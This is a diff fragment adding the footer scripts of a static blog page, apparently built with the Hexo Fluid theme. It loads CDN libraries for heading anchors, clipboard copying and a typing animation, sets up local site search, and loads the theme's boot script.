+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
